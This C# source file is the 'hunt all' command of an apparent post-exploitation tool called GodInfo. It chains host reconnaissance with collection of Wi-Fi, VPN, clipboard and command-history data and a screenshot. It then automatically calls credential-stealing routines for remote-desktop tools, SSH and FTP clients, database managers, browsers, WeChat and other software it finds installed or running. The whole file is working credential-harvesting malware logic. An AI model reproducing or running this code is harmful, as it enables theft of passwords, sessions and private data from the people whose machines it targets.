using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using GodInfo.Utils;

namespace GodInfo.Commands
{
    class HuntingAllCommand : ICommand
    {
        public void Execute(List<string> args)
        {
            new SystemInfoCommand().Execute(args);
            new ProcessCommand().PrintProcessInfo(Logger.globalLogDirectory);
            new WifiCredCommand().Execute(args);
            new VpnCredCommand().Execute(args);
            new NetworkInfoCommand().Execute(args);
            new RDPInfoCommand().Execute(args);
            new SoftwareInfoCommand().Execute(args);
            new UserFileInfoCommand().Execute(args);
            new ClipboardInfoCommand().Execute(args);
            new CommandHistoryInfoCommand().Execute(args);
            new RunMRUInfoCommand().Execute(args);
            new IISInfoCommand().Execute(args);
            Logger.TaskHeader("Hunting Software Credentials", 1);
            ExecuteConditionalCommands();
            ScreenShotPostCommand.CaptureScreenshot(Logger.globalLogDirectory);
            new DomainInfoCommand().Execute(args);
        }

        private void ExecuteConditionalCommands()
        {
            var softwareTargets = GetSoftwareTargets();

            foreach (var target in softwareTargets)
            {
                bool shouldExecute = false;

                foreach (var installName in target.InstallNames)
                {
                    if (GlobalContext.InstalledSoftware.Exists(s => s.name.Contains(installName)))
                    {
                        shouldExecute = true;
                        Logger.WriteLine($"[+] Hunted installed software: {installName}");
                        break;
                    }
                    else
                    {
                        Logger.WriteLine($"[-] Not found installed software: {installName}");
                    }
                }
                if (!shouldExecute)
                {
                    foreach (var processName in target.ProcessNames)
                    {
                        //Logger.WriteLine($"[*] Checking for running process: {processName}");
                        var runningProcess = GlobalContext.RunningProcesses.FirstOrDefault(p => p.ProcessName.Contains(processName));
                        if (!runningProcess.Equals(default(ProcessCommand.ProcessInfo)))
                        {
                            shouldExecute = true;
                            Logger.WriteLine($"[+] Hunted running process: {runningProcess.ProcessName} (matched with: {processName})");
                            break;
                        }
                        else
                        {
                            Logger.WriteLine($"[-] Not found running process: {processName}");
                        }
                    }
                }
                if (!shouldExecute)
                {
                    foreach (var condition in target.AdditionalConditions)
                    {
                        if (condition())
                        {
                            shouldExecute = true;
                            Logger.WriteLine($"[+] Additional condition met.");
                            break;
                        }
                        else
                        {
                            Logger.WriteLine($"[-] Not met additional condition.");
                        }
                    }
                }
                if (shouldExecute)
                {
                    target.Command();
                }
                Logger.WriteLine("");
            }
        }

        private List<SoftwareTarget> GetSoftwareTargets()
        {
            return new List<SoftwareTarget>
            {
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "ToDesk" },
                    ProcessNames = new List<string> { "ToDesk.exe" },
                    Command = ToDeskCredCommand.GetToDeskCred
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "向日葵远程控制" },
                    ProcessNames = new List<string> { "SunloginClient.exe" },
                    Command = SunLoginCredCommand.GetSunLoginCred
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "微信" },
                    ProcessNames = new List<string> { "wechat.exe" },
                    Command = WeChatCredCommand.GetWechatCred
                },
                new SoftwareTarget
                {
                    //InstallNames = new List<string>(), // FinalShell 无安装名
                    ProcessNames = new List<string> { "finalshell.exe" },
                    Command = () => FinalShellCredCommand.GetFinalShellCred(),
                    AdditionalConditions = new List<Func<bool>>
                    {
                        () => FinalShellCredCommand.FindFinalShellConnPath() != null
                    }
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "FileZilla" },
                    ProcessNames = new List<string> { "filezilla.exe" },
                    Command = () => FileZillaCredCommand.GetFileZillaCred(),
                    AdditionalConditions = new List<Func<bool>>
                    {
                        () => FileZillaCredCommand.CheckFileZillaConfigExists()
                    }
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "MobaXterm" },
                    ProcessNames = new List<string> { "MobaXterm" },
                    Command = () => MobaXtermCredCommand.GetMobaXtermCred(),
                    AdditionalConditions = new List<Func<bool>>
                    {
                        () => MobaXtermCredCommand.DetermineMobaXtermVersion() != "Not Found"
                    }
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "Chrome" },
                    ProcessNames = new List<string> { "chrome.exe" },
                    Command = () => { ChromiumCredCommand.GetChromiumCred(); }, 
                    AdditionalConditions = new List<Func<bool>>
                    {
                        () => ChromiumCredCommand.CheckBrowserDataPathsExist()
                    }
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "Firefox", "Mozilla Firefox" },
                    ProcessNames = new List<string> { "firefox.exe" },
                    Command = FirefoxCredCommand.GetFirefoxCred,
                    AdditionalConditions = new List<Func<bool>>
                    {
                        () => Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"))
                    }
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "DBeaver" },
                    ProcessNames = new List<string> { "dbeaver.exe", "dbeaver64.exe" },
                    Command = () => DBeaverCredCommand.GetDBeaverCred(),
                    AdditionalConditions = new List<Func<bool>>
                    {
                        () => DBeaverCredCommand.CheckDBeaverConfigExists()
                    }
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "WinSCP" },
                    ProcessNames = new List<string> { "WinSCP.exe" },
                    Command = () => WinSCPCredCommand.GetWinSCPCred(),
                    AdditionalConditions = new List<Func<bool>>
                    {
                        () => WinSCPCredCommand.CheckWinSCPCredExists()
                    }
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "HeidiSQL" },
                    ProcessNames = new List<string> { "heidisql.exe" },
                    Command = () => HeidiSQLCredCommand.GetHeidiSQLCred(),
                    AdditionalConditions = new List<Func<bool>>
                    {
                        () => HeidiSQLCredCommand.CheckHeidiSQLCredExists()
                    }
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "Navicat Premium", "Navicat" },
                    ProcessNames = new List<string> { "navicat.exe", "navicatw.exe" },
                    Command = () => NavicatCredCommand.GetNavicatCred(),
                    AdditionalConditions = new List<Func<bool>>
                    {
                        () => NavicatCredCommand.CheckNavicatCredExists()
                    }
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "PL/SQL Developer", "PLSQL Developer" },
                    ProcessNames = new List<string> { "plsqldev.exe" },
                    Command = () => PLSQLDeveloperCredCommand.GetPLSQLDeveloperCred(),
                    AdditionalConditions = new List<Func<bool>>
                    {
                        () => PLSQLDeveloperCredCommand.CheckPLSQLDeveloperCredExists()
                    }
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "SQLyog" },
                    ProcessNames = new List<string> { "SQLyog.exe", "SQLyogCommunity.exe" },
                    Command = () => SQLyogCredCommand.GetSQLyogCred(),
                    AdditionalConditions = new List<Func<bool>>
                    {
                        () => SQLyogCredCommand.CheckSQLyogCredExists()
                    }
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "SecureCRT", "VanDyke SecureCRT" },
                    ProcessNames = new List<string> { "SecureCRT.exe" },
                    Command = () => SecureCRTCredCommand.GetSecureCRTCred(),
                    AdditionalConditions = new List<Func<bool>>
                    {
                        () => SecureCRTCredCommand.CheckSecureCRTExists()
                    }
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "Xmanager", "Xshell", "Xftp" },
                    ProcessNames = new List<string> { "Xshell.exe", "Xftp.exe", "Xmanager.exe" },
                    Command = XmanagerCredCommand.GetXmanagerCred,
                    AdditionalConditions = new List<Func<bool>>
                    {
                        () => XmanagerCredCommand.CheckXmanagerCredExists()
                    }
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "Microsoft Pinyin", "Windows" },
                    ProcessNames = new List<string> { "ChsIME.exe" },
                    Command = ChinesePinyinCredCommand.GetChinesePinyinCred,
                    AdditionalConditions = new List<Func<bool>>
                    {
                        () => ChinesePinyinCredCommand.CheckChinesePinyinCredExists()
                    }
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "TeamViewer" },
                    ProcessNames = new List<string> { "TeamViewer.exe" },
                    Command = () => { new TeamViewerCredCommand().Execute(new List<string>()); }
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "网易云音乐", "NetEase Cloud Music", "CloudMusic" },
                    ProcessNames = new List<string> { "cloudmusic.exe" },
                    Command = NeteaseCloudMusicCredCommand.GetNeteaseCloudMusicCred,
                    AdditionalConditions = new List<Func<bool>>
                    {
                        () => NeteaseCloudMusicCredCommand.CheckNeteaseCloudMusicExists()
                    }
                }
            };
        }

    }

    public class SoftwareTarget
    {
        public List<string> InstallNames { get; set; } = new List<string>();
        public List<string> ProcessNames { get; set; } = new List<string>();
        public Action Command { get; set; }
        public List<Func<bool>> AdditionalConditions { get; set; } = new List<Func<bool>>();
    }
}